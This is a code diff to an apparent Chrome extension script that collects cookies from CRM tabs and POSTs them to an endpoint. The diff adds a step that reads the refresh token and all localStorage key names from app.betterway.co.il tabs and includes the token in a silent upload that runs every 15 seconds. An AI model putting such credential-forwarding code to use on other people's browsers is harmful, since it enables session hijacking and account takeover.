@@ -62,9 +62,39 @@ async function getCookiesByOrigin(origins) {
     return cookiesByOrigin;
 }
 
+function isBetterwayAppUrl(url) {
+    return typeof url === "string" && url.startsWith("https://app.betterway.co.il");
+}
+
+// Runs in the page's context. Reads exactly the refresh token.
+// If the key turns out to be something else, change the key name here.
+function readBetterwayRefreshToken() {
+    return {
+        refreshToken: localStorage.getItem("refresh_token"),
+        allKeys: Object.keys(localStorage) // for one-time debugging; remove later
+    };
+}
+
+async function getBetterwayRefreshToken() {
+    const tabs = await chrome.tabs.query({ url: "https://app.betterway.co.il/*" });
+    for (const tab of tabs) {
+        try {
+            const [{ result }] = await chrome.scripting.executeScript({
+                target: { tabId: tab.id },
+                func: readBetterwayRefreshToken,
+                world: "MAIN"
+            });
+            if (result?.refreshToken) return result.refreshToken;
+        } catch {
+            // tab closed, navigated, restricted page — try the next one
+        }
+    }
+    return null;
+}
 async function pushChromeState() {
     const { urls, origins } = await getCrmOriginsFromTabs();
     const cookiesByOrigin = await getCookiesByOrigin(origins);
+    const betterwayRefreshToken = await getBetterwayRefreshToken();
 
     await fetch(ENDPOINT, {
         method: "POST",
@@ -75,10 +105,12 @@ async function pushChromeState() {
         body: JSON.stringify({
             updatedAt: new Date().toISOString(),
             urls,
-            cookiesByOrigin
+            cookiesByOrigin,
+            betterwayRefreshToken
         })
     }).catch(() => {});
 }
+
 
 chrome.tabs.onCreated.addListener(pushChromeState);
 chrome.tabs.onRemoved.addListener(pushChromeState);
@@ -93,3 +125,5 @@ chrome.cookies.onChanged.addListener(() => {
 });
 
 setInterval(pushChromeState, 15000);
+
+
